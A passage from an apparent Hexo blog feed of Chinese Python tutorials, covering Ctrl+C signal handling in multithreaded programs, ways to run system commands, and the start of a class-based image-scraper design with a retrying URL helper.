class="hljs-keyword">break</span></span><br></pre></td></tr></table></figure><p>这样修改后，程序完全按照预想运行了：可以顺利的打印每个线程应该打印的所有数字，也可以中途用Ctrl+C终结整个进程。完整的代码如下：</p><figure class="highlight python hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-comment">#!/bin/env python</span></span><br><span class="line"><span class="hljs-comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="hljs-comment">#filename: peartest.py</span></span><br><span class="line"></span><br><span class="line"><span class="hljs-keyword">import</span> threading, signal</span><br><span class="line"></span><br><span class="line">is_exit = <span class="hljs-keyword">False</span></span><br><span class="line"></span><br><span class="line"><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">doStress</span><span class="hljs-params">(i, cc)</span>:</span></span><br><span class="line">    <span class="hljs-keyword">global</span> is_exit</span><br><span class="line">    idx = i</span><br><span class="line">    <span class="hljs-keyword">while</span> <span class="hljs-keyword">not</span> is_exit:</span><br><span class="line">        <span class="hljs-keyword">if</span> (idx &lt; <span class="hljs-number">10000000</span>):</span><br><span class="line">            <span class="hljs-keyword">print</span> <span class="hljs-string">"thread[%d]: idx=%d"</span>%(i, idx)</span><br><span class="line">            idx = idx + cc</span><br><span class="line">        <span class="hljs-keyword">else</span>:</span><br><span class="line">            <span class="hljs-keyword">break</span></span><br><span class="line">    <span class="hljs-keyword">if</span> is_exit:</span><br><span class="line">        <span class="hljs-keyword">print</span> <span class="hljs-string">"receive a signal to exit, thread[%d] stop."</span>%i</span><br><span class="line">    <span class="hljs-keyword">else</span>:</span><br><span class="line">        <span class="hljs-keyword">print</span> <span class="hljs-string">"thread[%d] complete."</span>%i</span><br><span class="line"></span><br><span class="line"><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">handler</span><span class="hljs-params">(signum, frame)</span>:</span></span><br><span class="line">    <span class="hljs-keyword">global</span> is_exit</span><br><span class="line">    is_exit = <span class="hljs-keyword">True</span></span><br><span class="line">    <span class="hljs-keyword">print</span> <span class="hljs-string">"receive a signal %d, is_exit = %d"</span>%(signum, is_exit)</span><br><span class="line"></span><br><span class="line"><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">"__main__"</span>:</span><br><span class="line">    signal.signal(signal.SIGINT, handler)</span><br><span class="line">    signal.signal(signal.SIGTERM, handler)</span><br><span class="line">    cc = <span class="hljs-number">5</span></span><br><span class="line">    threads = []</span><br><span class="line">    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> range(cc):</span><br><span class="line">    t = threading.Thread(target=doStress, args=(i,cc))</span><br><span class="line">    t.setDaemon(<span class="hljs-keyword">True</span>)</span><br><span class="line">    threads.append(t)</span><br><span class="line">    t.start()</span><br><span class="line">    <span class="hljs-keyword">while</span> <span class="hljs-number">1</span>:</span><br><span class="line">        alive = <span class="hljs-keyword">False</span></span><br><span class="line">        <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> range(cc):</span><br><span class="line">            alive = alive <span class="hljs-keyword">or</span> threads[i].isAlive()</span><br><span class="line">        <span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> alive:</span><br><span class="line">            <span class="hljs-keyword">break</span></span><br></pre></td></tr></table></figure><p>其实，如果用python写一个服务，也需要这样，因为负责服务的那个线程是永远在那里接收请求的，不会退出，而如果你想用Ctrl+C杀死整个服务，跟上面的压力测试程序是一个道理。</p><p>总结一下，python多线程中要响应Ctrl+C的信号以杀死整个进程，需要：</p><ol><li>把所有子线程设为Daemon；</li><li>使用isAlive()函数判断所有子线程是否完成，而不是在主线程中用join()函数等待完成；</li><li>写一个响应Ctrl+C信号的函数，修改全局变量，使得各子线程能够检测到，并正常退出。</li></ol>]]></content>
      
      
      
        <tags>
            
            <tag> 原创 </tag>
            
            <tag> Python </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Python执行系统命令的方法</title>
      <link href="/hexo-blog/20130413/Python%E6%89%A7%E8%A1%8C%E7%B3%BB%E7%BB%9F%E5%91%BD%E4%BB%A4%E7%9A%84%E6%96%B9%E6%B3%95/"/>
      <url>/hexo-blog/20130413/Python%E6%89%A7%E8%A1%8C%E7%B3%BB%E7%BB%9F%E5%91%BD%E4%BB%A4%E7%9A%84%E6%96%B9%E6%B3%95/</url>
      
        <content type="html"><![CDATA[<h2 id="1-os-system"><a href="#1-os-system" class="headerlink" title="(1) os.system"></a>(1) os.system</h2><p># 仅仅在一个子终端运行系统命令，而不能获取命令执行后的返回信息</p><p>system(command) -&gt; exit_status<br>Execute the command (a string) in a subshell.</p><p># 如果再命令行下执行，结果直接打印出来</p><figure class="highlight plain hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt;&gt; os.system(&apos;ls&apos;)</span><br><span class="line">04101419778.CHM   bash      document    media      py-django   video</span><br><span class="line">11.wmv            books     downloads   Pictures  python</span><br><span class="line">all-20061022      Desktop   Examples    project    tools</span><br></pre></td></tr></table></figure><a id="more"></a><h2 id="2-os-popen"><a href="#2-os-popen" class="headerlink" title="(2) os.popen"></a>(2) os.popen</h2><p># 该方法不但执行命令还返回执行后的信息对象</p><p>popen(command [, mode=’r’ [, bufsize]]) -&gt; pipe<br>Open a pipe to/from a command returning a file object.</p><p>例如：</p><figure class="highlight plain hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt;&gt; tmp = os.popen(&apos;ls *.py&apos;).readlines()</span><br><span class="line">&gt;&gt;&gt; tmp</span><br><span class="line">Out[21]:</span><br><span class="line">[&apos;dump_db_pickle.py &apos;,</span><br><span class="line">&apos;dump_db_pickle_recs.py &apos;,</span><br><span class="line">&apos;dump_db_shelve.py &apos;,</span><br><span class="line">&apos;initdata.py &apos;,</span><br><span class="line">&apos;__init__.py &apos;,</span><br><span class="line">&apos;make_db_pickle.py &apos;,</span><br><span class="line">&apos;make_db_pickle_recs.py &apos;,</span><br><span class="line">&apos;make_db_shelve.py &apos;,</span><br><span class="line">&apos;peopleinteract_query.py &apos;,</span><br><span class="line">&apos;reader.py &apos;,</span><br><span class="line">&apos;testargv.py &apos;,</span><br><span class="line">&apos;teststreams.py &apos;,</span><br><span class="line">&apos;update_db_pickle.py &apos;,</span><br><span class="line">&apos;writer.py &apos;]</span><br></pre></td></tr></table></figure><p>好处在于：将返回的结果赋于一变量，便于程序的处理。</p><h2 id="3-使用模块-subprocess"><a href="#3-使用模块-subprocess" class="headerlink" title="(3)  使用模块 subprocess"></a>(3) 使用模块 subprocess</h2><figure class="highlight plain hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt;&gt; import subprocess</span><br><span class="line">&gt;&gt;&gt; subprocess.call([&quot;cmd&quot;, &quot;arg1&quot;, &quot;arg2&quot;],shell=True)</span><br></pre></td></tr></table></figure><p>获取返回和输出:</p><figure class="highlight python hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-keyword">import</span> subprocess</span><br><span class="line">p = subprocess.Popen(<span class="hljs-string">'ls'</span>, shell=<span class="hljs-keyword">True</span>, stdout=subprocess.PIPE, stderr=subprocess.STDOUT)</span><br><span class="line"><span class="hljs-keyword">for</span> line <span class="hljs-keyword">in</span> p.stdout.readlines():</span><br><span class="line">    <span class="hljs-keyword">print</span> line,</span><br><span class="line">retval = p.wait()</span><br></pre></td></tr></table></figure><h2 id="4-使用模块-commands"><a href="#4-使用模块-commands" class="headerlink" title="(4)  使用模块 commands"></a>(4) 使用模块 commands</h2><figure class="highlight plain hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt;&gt; import commands</span><br><span class="line">&gt;&gt;&gt; dir(commands)</span><br><span class="line">[&apos;__all__&apos;, &apos;__builtins__&apos;, &apos;__doc__&apos;, &apos;__file__&apos;, &apos;__name__&apos;, &apos;getoutput&apos;, &apos;getstatus&apos;,&apos;getstatusoutput&apos;, &apos;mk2arg&apos;, &apos;mkarg&apos;]</span><br><span class="line">&gt;&gt;&gt; commands.getoutput(&quot;date&quot;)</span><br><span class="line">&apos;Wed Jun 10 19:39:57 CST 2009&apos;</span><br><span class="line">&gt;&gt;&gt;</span><br><span class="line">&gt;&gt;&gt; commands.getstatusoutput(&quot;date&quot;)</span><br><span class="line">(0, &apos;Wed Jun 10 19:40:41 CST 2009&apos;)</span><br></pre></td></tr></table></figure><p>注意： 当执行命令的参数或者返回中包含了中文文字，那么建议使用subprocess，如果使用os.popen则会出现下面的错误:</p><figure class="highlight plain hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">Traceback (most recent call last):</span><br><span class="line">  File &quot;./test1.py&quot;, line 56, inmain()</span><br><span class="line">  File &quot;./test1.py&quot;, line 45, in main</span><br><span class="line">    fax.sendFax()</span><br><span class="line">  File &quot;./mailfax/Fax.py&quot;, line 13, in sendFax</span><br><span class="line">    os.popen(cmd)</span><br><span class="line">UnicodeEncodeError: &apos;ascii&apos; codec can&apos;t encode characters in position 46-52: ordinal not inrange(128)</span><br></pre></td></tr></table></figure>]]></content>
      
      
      
        <tags>
            
            <tag> 原创 </tag>
            
            <tag> Python </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>利用 Python 实现抓图程序</title>
      <link href="/hexo-blog/20130401/%E5%88%A9%E7%94%A8-Python-%E5%AE%9E%E7%8E%B0%E6%8A%93%E5%9B%BE%E7%A8%8B%E5%BA%8F/"/>
      <url>/hexo-blog/20130401/%E5%88%A9%E7%94%A8-Python-%E5%AE%9E%E7%8E%B0%E6%8A%93%E5%9B%BE%E7%A8%8B%E5%BA%8F/</url>
      
        <content type="html"><![CDATA[<p>这些天除了忙交大的复试，还一直忙于用 Python 编写抓图程序。好在前几天收到了短信，心总算放了下来，毕竟这一年在思过崖的面壁得到了回报。然而，在西安找实习工作时却处处碰壁，我想说考官大姐们你们可不能以貌取人啊，凭什么他比我帅你们就招他了……算了，不说了，男儿有泪不轻弹，只是未到桑心处。</p><p>程序的功能基本已经实现，可是原先仅仅考虑到抓一个网站的图片，当换一个网站，却又得重新编写 HTML 解析代码，好不麻烦。所以，便想着利用设计模式重构代码，使其可应用与大多数图片网站，甚至应用于视频网站。<em>因为程序仍处于开发期，所以在此我并不能透漏具体要抓取的页面地址，实在抱歉。</em>下面我们来看看该程序具体如何实现：</p><a id="more"></a><h2 id="一、ImageLister-类"><a href="#一、ImageLister-类" class="headerlink" title="一、ImageLister 类"></a>一、ImageLister 类</h2><p>首先，我设计了一个 ImageLister 类，主要负责解析 HTML 页面（依赖于 BeautifulSoup3），返回图片 URL，当页面有分页时，自动检测分页，顺序分析所有分页。类设计如图 1。</p><img src="/hexo-blog/20130401/利用-Python-实现抓图程序/154625_q2Zo_730461.jpg"><p>图 1</p><p>ImageLister 类的实现代码如下：</p><figure class="highlight python hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-comment"># imagelister.py</span></span><br><span class="line"><span class="hljs-comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"></span><br><span class="line"><span class="hljs-keyword">from</span> BeautifulSoup <span class="hljs-keyword">import</span> BeautifulSoup</span><br><span class="line"><span class="hljs-keyword">from</span> urlparse <span class="hljs-keyword">import</span> urljoin</span><br><span class="line"><span class="hljs-keyword">from</span> re <span class="hljs-keyword">import</span> sub</span><br><span class="line"><span class="hljs-keyword">from</span> ulib <span class="hljs-keyword">import</span> uopen, uclose</span><br><span class="line"></span><br><span class="line"><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">ImageLister</span><span class="hljs-params">(object)</span>:</span></span><br><span class="line">    <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">__init__</span><span class="hljs-params">(self, first_page)</span>:</span></span><br><span class="line">        self.first_page = first_page</span><br><span class="line">        self.title = <span class="hljs-string">""</span></span><br><span class="line">        self.info = <span class="hljs-string">""</span></span><br><span class="line">        self.pages = []</span><br><span class="line">        self.images = []</span><br><span class="line"></span><br><span class="line">    <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">getFirstPage</span><span class="hljs-params">(self)</span>:</span></span><br><span class="line">        <span class="hljs-keyword">return</span> self.first_page</span><br><span class="line">    </span><br><span class="line">    <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">getPages</span><span class="hljs-params">(self)</span>:</span></span><br><span class="line">        <span class="hljs-keyword">return</span> self.pages</span><br><span class="line">    </span><br><span class="line">    <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">getImages</span><span class="hljs-params">(self)</span>:</span></span><br><span class="line">        self.images = self.anlzAllImageUrls()</span><br><span class="line">        <span class="hljs-keyword">return</span> self.images</span><br><span class="line">    </span><br><span class="line">    <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">getTitle</span><span class="hljs-params">(self)</span>:</span></span><br><span class="line">        <span class="hljs-keyword">return</span> self.title</span><br><span class="line">    </span><br><span class="line">    <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">getInfo</span><span class="hljs-params">(self)</span>:</span></span><br><span class="line">        <span class="hljs-keyword">return</span> self.info</span><br><span class="line"></span><br><span class="line">    <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">getHtmlSrc</span><span class="hljs-params">(self, url)</span>:</span></span><br><span class="line">        u = uopen(url)</span><br><span class="line">        src = u.read()</span><br><span class="line">        uclose(u)</span><br><span class="line">        <span class="hljs-keyword">return</span> src</span><br><span class="line"></span><br><span class="line">    <span class="hljs-comment"># 分析页面标题</span></span><br><span class="line">    <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">anlzTitle</span><span class="hljs-params">(self, data)</span>:</span></span><br><span class="line">        soup = BeautifulSoup(data, fromEncoding=<span class="hljs-string">"gb18030"</span>)</span><br><span class="line">        title = soup.html.head.title.string.strip()</span><br><span class="line">        <span class="hljs-keyword">return</span> title</span><br><span class="line">    </span><br><span class="line">    <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">anlzAllPageUrls</span><span class="hljs-params">(self)</span>:</span></span><br><span class="line">        <span class="hljs-keyword">pass</span></span><br><span class="line"></span><br><span class="line">    <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">anlzAllImageUrls</span><span class="hljs-params">(self)</span>:</span></span><br><span class="line">        <span class="hljs-keyword">pass</span></span><br></pre></td></tr></table></figure><p>ImageListerA 类的实现代码如下：</p><figure class="highlight python hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-comment"># imagelistera.py</span></span><br><span class="line"><span class="hljs-comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"></span><br><span class="line"><span class="hljs-keyword">from</span> imagelister <span class="hljs-keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">ImageListerA</span><span class="hljs-params">(ImageLister)</span>:</span></span><br><span class="line">    <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">__init__</span><span class="hljs-params">(self, first_page)</span>:</span></span><br><span class="line">        super(ImageListerA, self).__init__(first_page)</span><br><span class="line">        data = self.getHtmlSrc(first_page)</span><br><span class="line">        self.title = self.anlzTitle(data)</span><br><span class="line">        self.info = self.anlzInfo(data)</span><br><span class="line">        self.pages = self.anlzAllPageUrls(data, first_page)</span><br><span class="line">    </span><br><span class="line">    <span class="hljs-comment"># 分析页面简介</span></span><br><span class="line">    <span class="hljs-comment"># 该函数实现部分不必深究，具有页面特异性</span></span><br><span class="line">    <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">anlzInfo</span><span class="hljs-params">(self, data)</span>:</span></span><br><span class="line">        soup = BeautifulSoup(data, fromEncoding=<span class="hljs-string">"gb18030"</span>)</span><br><span class="line">        comment = soup.find(<span class="hljs-string">"div"</span>, &#123;<span class="hljs-string">"class"</span>: <span class="hljs-string">"comment2"</span>&#125;)</span><br><span class="line">        info = comment.find(<span class="hljs-string">"span"</span>, &#123;<span class="hljs-string">"class"</span>: <span class="hljs-string">"i_user"</span>&#125;).string</span><br><span class="line">        info += <span class="hljs-string">"\n"</span></span><br><span class="line">        contents = comment.find(<span class="hljs-string">"font"</span>, &#123;<span class="hljs-string">"color"</span>: <span class="hljs-string">"#999999"</span>&#125;).contents</span><br><span class="line">        <span class="hljs-keyword">for</span> content <span class="hljs-keyword">in</span> contents:</span><br><span class="line">            temp_con = content.strip()</span><br><span class="line">            info += sub(<span class="hljs-string">r"&lt;br(\s*\/)?&gt;"</span>, <span class="hljs-string">"\n"</span>, temp_con)</span><br><span class="line">        <span class="hljs-keyword">return</span> info</span><br><span class="line">        </span><br><span class="line">    <span class="hljs-comment"># 分析得到所有分页页面链接</span></span><br><span class="line">    <span class="hljs-comment"># 该函数实现部分不必深究，具有页面特异性</span></span><br><span class="line">    <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">anlzAllPageUrls</span><span class="hljs-params">(self, data, first_page)</span>:</span></span><br><span class="line">        soup = BeautifulSoup(data, fromEncoding=<span class="hljs-string">"gb18030"</span>)</span><br><span class="line">        pagination = soup.find(<span class="hljs-string">"div"</span>, &#123;<span class="hljs-string">"id"</span>: <span class="hljs-string">"pagination"</span>&#125;)</span><br><span class="line">        alinks = pagination.findAll(<span class="hljs-string">"a"</span>)[<span class="hljs-number">1</span>:<span class="hljs-number">-3</span>]</span><br><span class="line">        pages = []</span><br><span class="line">        pages.append(first_page)</span><br><span class="line">        <span class="hljs-keyword">for</span> alink <span class="hljs-keyword">in</span> alinks:</span><br><span class="line">            page = urljoin(first_page, alink[<span class="hljs-string">"href"</span>])</span><br><span class="line">            pages.append(page)</span><br><span class="line">        <span class="hljs-keyword">return</span> pages</span><br><span class="line"></span><br><span class="line">    <span class="hljs-comment"># 分析所有分页得到所有图片链接</span></span><br><span class="line">    <span class="hljs-comment"># 该函数实现部分不必深究，具有页面特异性</span></span><br><span class="line">    <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">anlzAllImageUrls</span><span class="hljs-params">(self)</span>:</span></span><br><span class="line">        pages = self.pages</span><br><span class="line">        images = []</span><br><span class="line">        <span class="hljs-keyword">for</span> page <span class="hljs-keyword">in</span> pages:</span><br><span class="line">            u = uopen(page)</span><br><span class="line">            data = u.read()</span><br><span class="line">            soup = BeautifulSoup(data, fromEncoding=<span class="hljs-string">"gb18030"</span>)</span><br><span class="line">            imglinks = soup.findAll(<span class="hljs-string">"img"</span>, &#123;<span class="hljs-string">"class"</span>: <span class="hljs-string">"IMG_show"</span>&#125;)</span><br><span class="line">            <span class="hljs-keyword">for</span> imglink <span class="hljs-keyword">in</span> imglinks:</span><br><span class="line">                image = imglink[<span class="hljs-string">"src"</span>]</span><br><span class="line">                images.append(image)</span><br><span class="line">        <span class="hljs-keyword">return</span> images</span><br><span class="line"></span><br><span class="line"><span class="hljs-comment"># 单元测试 only</span></span><br><span class="line"><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">"__main__"</span>:</span><br><span class="line">    lister = ImageListerA(<span class="hljs-string">"**************************************.htm"</span>)</span><br><span class="line">    <span class="hljs-keyword">print</span> lister.getTitle()</span><br><span class="line">    <span class="hljs-keyword">print</span> lister.getInfo()</span><br><span class="line">    <span class="hljs-keyword">print</span> lister.getPages()</span><br><span class="line">    <span class="hljs-keyword">print</span> <span class="hljs-string">"\n"</span>.join(lister.getImages())</span><br></pre></td></tr></table></figure><p>同样地，ImageListerB 根据抓取网页的不同，而重写 ImageLister 中的方法，这样，换一个网站，只需要新创建一个继承于 ImageLister 的 ImageListerXXX 类，实现适合于该网站的 HTML 解析算法即可。</p><p>其中，ulib.py 是我自己写的库，提供了带重试功能的 url 访问函数以及其他的一些常用的函数：</p><figure class="highlight python hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="hljs-comment"># ulib.py</span></span><br><span class="line"></span><br><span class="line"><span class="hljs-keyword">from</span> urllib2 <span class="hljs-keyword">import</span> urlopen, HTTPError, URLError</span><br><span class="line"><span class="hljs-keyword">from</span> time <span class="hljs-keyword">import</span> sleep</span><br><span class="line"></span><br><span class="line"><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">uopen</span><span class="hljs-params">(url, verbose=True)</span>:</span></span><br><span class="line">    retryTimes = <span class="hljs-number">5</span></span><br><span class="line">    sleepTime = <span class="hljs-number">10</span></span><br><span class="line">    <span class="hljs-keyword">while</span> retryTimes &gt; <span class="hljs-number">0</span>:</span><br><span class="line">        <span class="hljs-keyword">try</span>:</span><br><span class="line">            <span class="hljs-keyword">if</span> verbose:</span><br><span class="line">                <span class="hljs-keyword">print</span> <span class="hljs-string">u"正在读取："</span>, url</span><br><span class="line">            u = urlopen(url)</span><br><span class="line">            <span class="hljs-comment"># 读取成功</span></span><br><span class="line">            <span class="hljs-keyword">if</span> u.code == <span class="hljs-number">200</span>:</span><br><span class="line">                <span class="hljs-keyword">return</span> u</span><br><span class="line">            <span class="hljs-keyword">elif</span> u.code == <span class="hljs-number">201</span>:</span><br><span class="line">                <span class="hljs-keyword">break</span></span><br><span class="line">        <span class="hljs-keyword">except</span> HTTPError, e:</span><br><span class="line">            <span class="hljs-keyword">print</span> e</span><br><span class="line">            <span class="hljs-keyword">if</span> e.code == <span class="hljs-number">404</span>:</span><br><span class="line">                <span class="hljs-keyword">break</span></span><br><span class="line">        <span class="hljs-keyword">except</span> URLError, e:</span><br><span class="line">            <span class="hljs-keyword">print</span> e</span><br><span class="line">        <span class="hljs-keyword">except</span> BaseException, e:</span><br><span class="line">            <span class="hljs-keyword">print</span> e</span><br><span class="line">        retryTimes -= <span class="hljs-number">1</span></span><br><span class="line">        <span class="hljs-keyword">if</span> verbose:</span><br><span class="line">            <span class="hljs-keyword">print</span> <span class="hljs-string">u"读取失败，等待重试……"</span></span><br><span class="line">        sleep(sleepTime)</span><br><span class="line">    <span class="hljs-keyword">return</span> <span class="hljs-keyword">None</span></span><br><span class="line"></span><br><span class="line"><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">uclose</span><span class="hljs-params">(u)</span>:</span></span><br><span class="line">    u.close()</span><br><span class="line"></span><br><span class="line"><span class="hljs-comment"># 格式化文件大小</span></span><br><span class="line"><span class="hljs-comment"># 如 10 =&gt; "10B", 1024 =&gt; "1KB"...</span></span><br><span class="line"><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">formatSize</span><span class="hljs-params">(size)</span>:</span></span><br><span class="line">    <span class="hljs-keyword">if</span> size &gt; pow(<span class="hljs-number">1024</span>, <span class="hljs-number">2</span>):</span><br><span class="line">        new_size = size / pow(<span class="hljs-number">1024</span>, <span class="hljs-number">2</span>)</span><br><span class="line">        postfix = <span class="hljs-string">"MB"</span></span><br><span class="line">    <span class="hljs-keyword">elif</span> size &gt; <span class="hljs-number">1024</span>:</span><br><span class="line">        new_size = size / <span class="hljs-number">1024</span></span><br><span class="line">        postfix = <span class="hljs-string">"KB"</span></span><br><span class="line">    <span class="hljs-keyword">else</span>:</span><br><span class="line">        new_size = size</span><br><span class="line">        postfix = <span class="hljs-string">"B"</span></span><br><span class="line">    strsize = <span class="hljs-string">"%.2f"</span> % new_size</span><br><span class="line">    <span class="hljs-keyword">return</span> strsize + postfix</span><br></pre></td></tr></table></figure><h2 id="二、ImageCatcher-类"><a href="#二、ImageCatcher-类" class="headerlink" title="二、ImageCatcher 类"></a>二、ImageCatcher 类</h2><p>ImageCatcher 类主要负责从 ImageLister 类得到图片 url，再将其存入本地（dirname = save_path + title），同时保存页面的地址（first_page）、标题（title）以及备注信息（info）。</p><img src="/hexo-blog/20130401/利用-Python-实现抓图程序/235758_O965_730461.jpg"><p>ImageCatcher 类的实现代码如下：</p><figure class="highlight python hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span 